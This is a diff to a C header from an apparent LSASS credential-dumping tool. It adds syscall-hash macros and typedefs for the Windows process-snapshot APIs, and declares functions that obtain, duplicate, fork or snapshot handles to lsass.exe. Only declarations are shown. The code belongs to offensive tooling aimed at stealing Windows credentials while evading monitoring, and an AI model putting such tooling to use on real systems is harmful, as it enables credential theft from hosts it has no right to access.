@@ -1,9 +1,20 @@
 #pragma once
 
+#if defined(NANO) && !defined(SSP)
+
 #include <windows.h>
 #include <winternl.h>
 
-#if defined(NANO) && !defined(SSP)
+#include "utils.h"
+#include "dinvoke.h"
+
+typedef DWORD(WINAPI* PssNtCaptureSnapshot_t) (PHANDLE SnapshotHandle, HANDLE ProcessHandle, DWORD CaptureFlags, DWORD ThreadContextFlags);
+typedef DWORD(WINAPI* PssNtQuerySnapshot_t) (HANDLE SnapshotHandle, DWORD InformationClass, PVOID Buffer, DWORD BufferLength);
+typedef DWORD(WINAPI* PssNtFreeSnapshot_t) (HANDLE SnapshotHandle);
+
+#define PssNtCaptureSnapshot_SW2_HASH 0xE54FFDDB
+#define PssNtQuerySnapshot_SW2_HASH 0x568E92DE
+#define PssNtFreeSnapshot_SW2_HASH 0x248F0BD4
 
 #define LSASS_EXE L"lsass.exe"
 #define PROCESS_TYPE L"Process"
@@ -135,11 +146,13 @@ typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
 
 HANDLE make_handle_full_access(HANDLE hProcess);
 PSYSTEM_HANDLE_INFORMATION get_all_handles(void);
-BOOL GetTypeIndexByName(PULONG ProcesTypeIndex);
+BOOL   GetTypeIndexByName(PULONG ProcesTypeIndex);
 HANDLE obtain_lsass_handle(DWORD pid, DWORD permissions, BOOL dup, BOOL is_malseclogon_stage_2, LPCSTR dump_path);
 HANDLE duplicate_lsass_handle(DWORD lsass_pid, DWORD permissions);
 HANDLE get_process_handle(DWORD dwPid, DWORD dwFlags, BOOL quiet);
-HANDLE fork_process(DWORD dwPid, HANDLE hProcess);
+HANDLE fork_process(HANDLE hProcess);
+HANDLE snapshot_process(HANDLE hProcess, PHANDLE hSnapshot);
+BOOL   free_snapshot(HANDLE hSnapshot);
 HANDLE find_lsass(DWORD dwFlags);
 
 #endif
